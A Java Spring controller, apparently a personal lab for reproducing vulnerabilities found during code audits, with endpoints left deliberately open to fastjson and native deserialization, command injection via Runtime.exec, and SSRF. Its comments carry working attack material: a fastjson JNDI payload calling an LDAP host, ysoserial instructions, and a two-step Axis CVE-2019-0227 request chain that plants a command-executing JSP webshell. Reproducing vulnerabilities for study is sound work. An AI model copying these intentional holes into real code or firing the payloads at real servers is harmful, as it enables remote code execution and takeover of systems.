package controller;

import com.alibaba.fastjson.JSONObject;
import org.springframework.web.bind.annotation.*;
import javax.servlet.ServletInputStream;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletResponse;

/**
 * 漏洞复现专用环境
 * 用于平时代码审计的时候发现的组件漏洞复现
 * 有些系统启动报错，这个环境可以模拟来验证漏洞
**/



@RestController
public class TestController extends HttpServlet {
/****************************************************fastjson反序列化漏洞**********************************************************************/
    /**
     * 启动rmi服务：java -jar RogueJndi-1.0.jar -n 起服务的ip -c 要执行的命令
     * payload：{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://192.168.83.11:1389/o=tomcat","autoCommit":true}}";
     * 如果是get请求就编码（HTML）payload，POST则不用
     **/
    @RequestMapping(value = "/test")
    public String persist(@RequestBody String dataStr) {
        JSONObject data = JSONObject.parseObject(dataStr);
        return dataStr;
    }
/*************************************************原生反序列化漏洞************************************************************************/
    /**
     *使用打包的ysoserial生成一个二进制文件：java -jar ysoserial-master.jar 指定一个ysoserial里payload的类名 要执行的命令 > 1.txt
     * 使用burpsuite发送二进制文件：右键选择Paste from file,选择刚刚生成的文件
     **/
    @PostMapping(value = "/deserialize")
    public void deserialize(HttpServletRequest request) throws Exception {
        ServletInputStream inputStream = request.getInputStream();
        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
        objectInputStream.readObject();
        objectInputStream.close();
    }
/*******************************************************命令执行******************************************************************/

    @RequestMapping(value = "/rce")
    public void rce(HttpServletRequest req) throws  Exception{
        String cmd = req.getParameter("cmd");
        Runtime.getRuntime().exec(cmd);
    }
/********************************************************javamelody XXE漏洞*****************************************************************/

    public void javamelody_xxe(){
        System.out.println("javamelody xxe");
    }
/***********************************************************SSRF**************************************************************/

    @RequestMapping(value = "/ssrf")
    public void readfile(HttpServletRequest req, HttpServletResponse response) throws Exception{
        String path = req.getParameter("path");
        String bcontent;

        URL ssrf = new URL(path);
        URLConnection urlConnection = ssrf.openConnection();
        BufferedReader a = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
        StringBuffer b = new StringBuffer();
        while ((bcontent = a.readLine())!=null){
            b.append(bcontent);
        }
        a.close();
        ServletOutputStream outputStream = response.getOutputStream();
        outputStream.write(b.toString().getBytes());
        outputStream.flush();
        outputStream.close();
    }
/***************************************************axis远程命令执行**********************************************************************/
/**
 * 如果提示no SOAPAction header!那就在头部添加SOAPAction: something
 * 第一次请求：
 * POST /services/AdminService
 * SOAPAction: something
 *
 * <?xml version="1.0" encoding="utf-8"?>
 * <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 *         xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
 *         xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 *         xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
 *   <soapenv:Body>
 *     <ns1:deployment
 *   xmlns="http://xml.apache.org/axis/wsdd/"
 *   xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
 *   xmlns:ns1="http://xml.apache.org/axis/wsdd/">
 *   <ns1:service name="RandomService" provider="java:RPC">
 *     <requestFlow>
 *       <handler type="RandomLog"/>
 *     </requestFlow>
 *     <ns1:parameter name="className" value="java.util.Random"/>
 *     <ns1:parameter name="allowedMethods" value="*"/>
 *   </ns1:service>
 *   <handler name="RandomLog" type="java:org.apache.axis.handlers.LogHandler" >
 *     <parameter name="LogHandler.fileName" value="../webapps/ROOT/shell.jsp" />
 *     <parameter name="LogHandler.writeToConsole" value="false" />
 *   </handler>
 * </ns1:deployment>
 *   </soapenv:Body>
 * </soapenv:Envelope>
 * 第二次请求写shell内容：
 * POST /services/RandomService
 * SOAPAction: something
 *
 * <?xml version="1.0" encoding="utf-8"?>
 *         <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 *         xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
 *         xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 *         xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
 *         <soapenv:Body>
 *         <api:main
 *         soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
 *             <api:in0><![CDATA[
 * <%@page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>
 * ]]>
 *             </api:in0>
 *         </api:main>
 *   </soapenv:Body>
 * </soapenv:Envelope>
 * 得到webshell http://localhost/shell.jsp**/
    public void axis(){
        System.out.println("Axis CVE-2019-0227 远程命令执行");
}
}
